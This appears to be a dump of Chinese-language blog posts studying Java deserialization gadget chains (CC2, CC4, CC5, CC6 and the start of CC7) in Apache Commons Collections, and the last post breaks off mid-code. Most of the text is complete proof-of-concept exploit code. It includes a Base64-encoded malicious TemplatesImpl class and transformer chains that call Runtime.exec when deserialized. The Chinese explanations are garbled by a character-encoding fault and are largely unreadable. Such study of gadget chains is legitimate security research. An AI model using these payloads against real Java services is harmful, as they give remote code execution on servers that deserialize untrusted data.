//å­—èŠ‚ç  byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;); //åå°„è®¾ç½® Field TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); //ä¸ºäº†æ‰§è¡Œ templates.newTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{}); //TransformingComparator å®ä¾‹ TransformingComparator comparator = new TransformingComparator(invokerTransformer); //PriorityQueue å®ä¾‹ PriorityQueue priorityQueue = new PriorityQueue(2); //å…ˆè®¾ç½®ä¸ºæ­£å¸¸å˜é‡å€¼ï¼Œåé¢å¯ä»¥é€šè¿‡setFieldValueä¿®æ”¹ priorityQueue.add(1); priorityQueue.add(1); //åå°„è®¾ç½® Field Object[] objects = new Object[]{templates, templates}; setFieldValue(priorityQueue, &quot;queue&quot;, objects); setFieldValue(priorityQueue, &quot;comparator&quot;, comparator); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(priorityQueue); oos.flush(); oos.close(); //æµ‹è¯•ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } catch (Exception e) { e.printStackTrace(); } } //åå°„è®¾ç½® Field public static void setFieldValue(Object object, String fieldName, Object value) { try { Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); } catch (Exception e) { e.printStackTrace(); } } } è°ƒç”¨é“¾PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() â€¦â€¦â€¦â€¦ åé¢å’ŒCC3åé¢æ˜¯ä¸€æ ·çš„,ä¸»è¦æ˜¯çœ‹å‰åŠæ®µ PriorityQueueåœ¨java.util.PriorityQueueä¸­çš„readObjectæ–¹æ³•ä¸­,è°ƒç”¨äº†heapify()æ–¹æ³• è¿™é‡Œçš„queue[i]çš„å€¼æ˜¯ç”±readObjectå¾—åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨writeObjectå¤„å†™å…¥äº†å¯¹åº”çš„å†…å®¹ æ‰€ä»¥åœ¨æˆ‘ä»¬çš„pocä¸­ PriorityQueue priorityQueue = new PriorityQueue(2); //è¿™é‡Œæ”¾å…¥ä¸¤ä¸ªå€¼,è¿™æ ·æ‰èƒ½è¿›å…¥heapify()æ–¹æ³•ä¸­çš„siftDownæ–¹æ³• priorityQueue.add(1); //addä¼ å…¥çš„å€¼åˆ™æ˜¯æˆ‘ä»¬çš„queue,å…ˆä¼ å…¥1,åé¢é€šè¿‡åå°„è¿›è¡Œä¿®æ”¹ priorityQueue.add(1); heapifyæ–¹æ³•è°ƒç”¨siftDownæ–¹æ³• ç„¶åè°ƒç”¨siftDownUsingComparator() ç„¶åè°ƒç”¨äº†comparator.compare(),comparatorå¯æ§ TransformingComparatorç„¶åæˆ‘ä»¬çœ‹åˆ°å¦ä¸€ä¸ªç±»org.apache.commons.collections4.comparators.TransformingComparator,å…¶ä¸­æœ‰ä¸€ä¸ªcompareæ–¹æ³• this.transformerå¯æ§ã€‚ å…³äºPriorityQueueçš„åŸç†:https://www.cnblogs.com/linghu-java/p/9467805.html è¿™é‡Œå¦‚æœæˆ‘ä»¬TransformingComparator.transformerä¼ å…¥çš„Aå¯¹è±¡ è¿™é‡Œå°±ç›¸å½“äºæ‰§è¡ŒA.transform(obj);è¿™é‡Œåˆ©ç”¨InvokerTransformeræ¥è°ƒç”¨templates.newTransformer(),ç„¶ååé¢å°±è·ŸCC3çš„é“¾å­ä¸€æ ·ã€‚ ä¸€äº›å…¶ä»–ç‚¹å¦‚æœæˆ‘ä»¬ç›´æ¥priorityQueue.add(templates)ä¼šæŠ¥é”™ã€‚é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¦å…ˆåå°„ç„¶åå†ä¿®æ”¹queueçš„å€¼å‘¢ã€‚ è¿™é‡Œå› ä¸ºæˆ‘ä»¬åœ¨æ‰§è¡Œaddæ–¹æ³•çš„æ—¶å€™ã€‚ä¼šä¾æ¬¡è°ƒç”¨PriorityQueue#add()-&gt;PriorityQueue#offer()-&gt;PriorityQueue#siftUp(), å› ä¸ºå½“æ—¶æˆ‘ä»¬è¿˜æ²¡æœ‰ç»™comparatorèµ‹å€¼,æ‰€ä»¥ä¼šè¿›å…¥siftUpComparableæ–¹æ³• å½“æ‰§è¡Œåˆ°è¿™ä¸€å¥çš„æ—¶å€™å°±ä¼šæŠ¥é”™ å¦‚æœæˆ‘ä»¬åœ¨addå‰å¯¹comparatorèµ‹å€¼é‚£åˆ™å¯ä»¥æ­£å¸¸è¿è¡Œ æµç¨‹å›¾ CC4æµ‹è¯•ç¯å¢ƒ jdk1.7 Commons Collections 4 POCimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xerces.internal.impl.dv.util.Base64; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC4 { public static void main(String[] args) { try{ //å­—èŠ‚ç  byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;); //åå°„è®¾ç½® Field TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); //Transformeræ•°ç»„ Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //TransformingComparator å®ä¾‹ TransformingComparator comparator = new TransformingComparator(chainedTransformer); //PriorityQueue å®ä¾‹ PriorityQueue priorityQueue = new PriorityQueue(2); //å…ˆè®¾ç½®ä¸ºæ­£å¸¸å˜é‡å€¼ï¼Œåé¢å¯ä»¥é€šè¿‡setFieldValueä¿®æ”¹ priorityQueue.add(1); priorityQueue.add(1); //åå°„è®¾ç½® Field Object[] objects = new Object[]{templates, templates}; setFieldValue(priorityQueue, &quot;queue&quot;, objects); setFieldValue(priorityQueue, &quot;comparator&quot;, comparator); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(priorityQueue); oos.flush(); oos.close(); //æµ‹è¯•ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } catch (Exception e) { e.printStackTrace(); } } //åå°„è®¾ç½® Field public static void setFieldValue(Object object, String fieldName, Object value) { try { Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); } catch (Exception e) { e.printStackTrace(); } } } è°ƒç”¨é“¾ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() CC4 åªæ˜¯å°† CC2 ä¸­çš„ InvokerTransformer æ›¿æ¢ä¸ºäº† InstantiateTransformerã€‚ ç»“æŸè¯­è¿™æ˜¯è‡ªå·±éšæ‰‹ç”»çš„å›¾,è€Œä¸”å·¨ä¸‘,æ„Ÿå…´è¶£çš„å¯ä»¥å‚è€ƒä¸€ä¸‹ å› ä¸ºè‡ªå·±è·ŸCCé“¾çš„æ—¶å€™å‘ç°é“¾å­ä¹‹é—´éƒ½æœ‰ä¸€éƒ¨åˆ†ä¸€æ ·çš„,è€Œä¸”ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œä¸€äº›å˜æ¢çš„,æ¯”å¦‚æŠŠCC3çš„å…¥å£æ¢æˆå…¶ä»–é“¾å­çš„å…¥å£,å³å¯å®ç°JDK1.8ç‰ˆæœ¬çš„ä½¿ç”¨ã€‚æ‰€ä»¥æ„Ÿè§‰é™¤äº†è¿™7æ¡é“¾å­,è¿˜åº”è¯¥æœ‰å„ç§å˜ç§,æ¥åº”å¯¹ä¸åŒçš„æƒ…å†µ.æ‰€ä»¥è‡ªå·±å°è¯•ç”»äº†è¿™ä¸ªå›¾,åªè¦èƒ½ä»ä¸Šé¢èµ°åˆ°æœ€ä¸‹é¢çš„è·¯çº¿,åº”è¯¥éƒ½æ˜¯å¯ä»¥çš„(ä¸ªäººç†è§£,æ²¡æœ‰ä»»ä½•ä¾æ®,åˆ‡å‹¿ç›´æ¥å½“çœŸ,è¿˜éœ€è¦è¯æ˜)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"Javaå¤ç°","slug":"Javaå¤ç°","permalink":"https://pp1ove.gitee.io/tags/Javaå¤ç°/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"CCé“¾å­¦ä¹ -ä¸­","slug":"CCé“¾å­¦ä¹ -ä¸­","date":"2021-07-13T03:03:25.000Z","updated":"2021-07-19T13:01:00.606Z","comments":false,"path":"2021/07/13/CCé“¾å­¦ä¹ -ä¸­/","link":"","permalink":"https://pp1ove.gitee.io/2021/07/13/CCé“¾å­¦ä¹ -ä¸­/","excerpt":"","text":"CC5æµ‹è¯•ç¯å¢ƒ jdk1.7 Commons Collections 3.1 POCimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; public class CC51 { public static Object generatePayload() throws Exception { ChainedTransformer Transformerchain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[]{&quot;calc&quot;})}); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,Transformerchain); TiedMapEntry tiedmap = new TiedMapEntry(map,123); BadAttributeValueExpException poc = new BadAttributeValueExpException(1); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(poc,tiedmap); return poc; } public static void main(String[] args) throws Exception { payload2File(generatePayload(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //å°†æ„é€ å¥½çš„payloadåºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­ ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //è¯»å–å†™å…¥çš„payloadï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ– ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } åˆ©ç”¨é“¾ ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() é€šè¿‡åˆ©ç”¨é“¾å…¶å®å¯ä»¥çœ‹å‡ºæ¥,CC5çš„ååŠæ®µåˆ©ç”¨é“¾å’ŒCC1çš„lazymapé‚£æ¡é“¾åé¢æ®µæ˜¯ä¸€æ ·çš„,éƒ½æ˜¯è°ƒç”¨LazyMapçš„getæ–¹æ³•è§¦å‘å‘½ä»¤,è¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹å‰é¢æ˜¯å¦‚ä½•è°ƒç”¨åˆ°LazyMap.get()çš„; TiedMapEntry åœ¨toStringæ–¹æ³•ä¸­è°ƒç”¨äº†getValue()æ–¹æ³•,è·Ÿè¿›å» è°ƒç”¨äº†map.getæ–¹æ³•,å…³äºmapåœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼,mapæˆå‘˜å¯æ§,æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾å“ªé‡Œè°ƒç”¨äº†toStringæ–¹æ³• åœ¨cc5ä¸­ä½¿ç”¨äº†BadAttributeValueExpExceptionè¿™ä¸ªç±»ã€‚ BadAttributeValueExpException åœ¨è¯¥ç±»çš„readObjectæ–¹æ³•ä¸­,è°ƒç”¨äº†valObj.toString();é‚£ä¹ˆè¿™ä¸ªvalObjæ˜¯ä»å“ªé‡Œæ¥çš„å‘¢ å¯ä»¥çœ‹åˆ°è·å–äº†valæˆå‘˜çš„å€¼èµ‹å€¼ç»™äº†valObj,è¿™é‡Œæˆ‘ä»¬è®©val=TiedMapEntryå¯¹è±¡å³å¯ æµç¨‹å›¾ CC6æµ‹è¯•ç¯å¢ƒ jdk 1.7 Commons Collections 3.1 POCimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CC61 { public static Object generatePayload() throws Exception { Transformer fakeTransformerransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; Map map = new HashMap(); Map lazyMap = LazyMap.decorate(map, fakeTransformerransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;keykey&quot;); HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); lazyMap.remove(&quot;keykey&quot;); //å¦‚æœä¸åŠ è¿™ä¸ªå°±æ— æ³•å¼¹å‡ºè®¡ç®—å™¨ //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); field.setAccessible(true); field.set(fakeTransformerransformer, transformers); return hashSet; } public static void main(String[] args) throws Exception { payload2File(generatePayload(), &quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //å°†æ„é€ å¥½çš„payloadåºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­ ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //è¯»å–å†™å…¥çš„payloadï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ– ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } åˆ©ç”¨é“¾java.io.ObjectInputStream.readObject() HashSet.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() åé¢ä¸€æ®µä»ç„¶æ˜¯LazyMap.get(),ä¸»è¦è¿˜æ˜¯çœ‹å‰åŠæ®µ TiedMapEntry TiedMapEntryè°ƒç”¨äº†getValue() getValue()æ–¹æ³•è°ƒç”¨äº†mapæˆå‘˜çš„getæ–¹æ³•,è¿™é‡Œmapæˆå‘˜å¯æ§,æˆ‘ä»¬è®¾ç½®ä¸ºlazymapå¯¹è±¡ æ¥ä¸‹æ¥å°±éœ€è¦æ‰¾å“ªé‡Œè§¦å‘äº†hashCodeï¼Œcc6ä¸­ä½¿ç”¨çš„æ˜¯HashMap#hash HashMap è€Œputæ–¹æ³•è°ƒç”¨äº†hashæ–¹æ³•,å¹¶ä¸”æˆ‘ä»¬å¯ä»¥å¯ä»¥å°†keyä½œä¸ºhashæ–¹æ³•çš„è¾“å…¥,æ¥ä¸‹æ¥å°±è¿˜å·®ä¸€ä¸ªå…¥å£äº† HashSetysoserialé€‰æ‹©çš„æ˜¯HashSet#readObject() åœ¨hashmap#readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†mapå¯¹è±¡çš„putæ–¹æ³•,mapå¯¹è±¡æ˜¯åœ¨ä¸Šé¢å‡ æ’èµ‹çš„å€¼,è¿™é‡Œæœ‰ä¸ªåˆ¤æ–­è¯­å¥,è¿™åˆ¤æ–­è¯­å¥æŒºå¥½æ§åˆ¶çš„,è¿™é‡Œæˆ‘ä»¬éœ€è¦è®©map=new HashMap(å…¶å®ä¸ºLinkedHashMapä¹Ÿä¸å½±å“,LinkedHashMapç»§æ‰¿äºHashMap,ä¹Ÿæ²¡æœ‰é‡å†™putæ–¹æ³•å’Œhashæ–¹æ³•),ç„¶åå°±æ˜¯å…³äºæˆ‘ä»¬ä¼ å…¥çš„e;å‚æ•°eæ˜¯ç”¨readObjectå–å‡ºæ¥çš„ï¼Œé‚£ä¹ˆå¯¹åº”çš„æˆ‘ä»¬å°±çœ‹çœ‹writeObjectæ€ä¹ˆå†™çš„: æˆ‘ä»¬éœ€è¦æ§åˆ¶ä¼ å…¥mapçš„keySetè¿”å›ç»“æœæ¥æ§åˆ¶å˜é‡ã€‚ æµç¨‹å›¾ Pç¥ç‰ˆæœ¬åœ¨ä¸Šé¢çš„æµç¨‹çš„æœ€åä¸€æ­¥ä¸­,æˆ‘ä»¬å…¶å®æ‰¾åˆ°ä¸€ä¸ªreadObjectæ–¹æ³•èƒ½è°ƒç”¨HashMap#putæˆ–è€…HashMap#hashå°±è¡Œäº†,è€ŒHashMapæ˜¯è‡ªå¸¦readObjectæ–¹æ³•çš„, è·Ÿè¿›å» è¿™é‡Œç›´æ¥è°ƒç”¨äº†hashæ–¹æ³•,keyä¹Ÿå¯æ§ã€‚ ä¸€äº›å…¶ä»–ç‚¹è¿™é‡Œä¸ºäº†é¿å…æœ¬åœ°è°ƒè¯•æ—¶è§¦å‘å‘½ä»¤æ‰§â¾ï¼Œæ„é€ LazyMapçš„æ—¶å€™å…ˆâ½¤äº†â¼€ä¸ªâ¼ˆç•œâ½†å®³çš„ fakeTransformerransformer å¯¹è±¡ï¼Œç­‰æœ€åè¦â½£æˆPayloadçš„æ—¶å€™ï¼Œå†æŠŠçœŸæ­£çš„ transformers æ›¿æ¢è¿›å»ã€‚(å¦‚æœæ­£å¸¸å†™åº”è¯¥ä¹Ÿæ²¡å•¥é—®é¢˜) ä½†æ˜¯å¦‚æœå»æ‰æˆ‘ä»¬pocä¸­çš„lazyMap.remove(&quot;keykey&quot;); Runçš„æ—¶å€™å¹¶ä¸ä¼šå¼¹å‡ºè®¡ç®—å™¨,è°ƒè¯•ä¸€ä¸‹å‘ç°å®ƒå¹¶æ²¡æœ‰è¿›å…¥lazymap#getæ–¹æ³•ä¸­çš„ifè¯­å¥,ä½†æ˜¯æˆ‘ä»¬æ˜æ˜æ²¡æœ‰åœ¨lazyMapä¸­åŠ å…¥â€keykeyâ€å‘€ è¿™æ˜¯åº”è¯¥æ˜¯å› ä¸ºåœ¨è°ƒç”¨hashSet#addæ—¶è°ƒç”¨äº†hashMapçš„putæ–¹æ³•, HashMapçš„putâ½…æ³•ä¸­ï¼Œä¹Ÿæœ‰è°ƒâ½¤åˆ° hash(key) è¿™â¾¥å°±å¯¼è‡´ LazyMap è¿™ä¸ªåˆ©â½¤é“¾åœ¨è¿™â¾¥è¢«è°ƒâ½¤äº†â¼€éï¼Œå› ä¸ºæˆ‘å‰â¾¯â½¤äº†fakeTransformers ,æ‰€ä»¥æ­¤ æ—¶å¹¶æ²¡æœ‰è§¦å‘å‘½ä»¤æ‰§â¾,ä½†å®é™…ä¸Šä¹Ÿå¯¹æˆ‘ä»¬æ„é€ Payloadäº§â½£äº†å½±å“ã€‚ è§£å†³â½…æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å°†keykeyè¿™ä¸ªKey,å†ä»outerMapä¸­ç§»é™¤å³å¯ï¼š lazyMap.remove(â€œkeykeyâ€) CC7æµ‹è¯•ç¯å¢ƒ jdk 1.8 Commons Collections 3.1 POCimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.AbstractMapDecorator; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.AbstractMap; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CC71 { public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException { Transformer[] fakeTransformerransformer = new Transformer[]{}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new 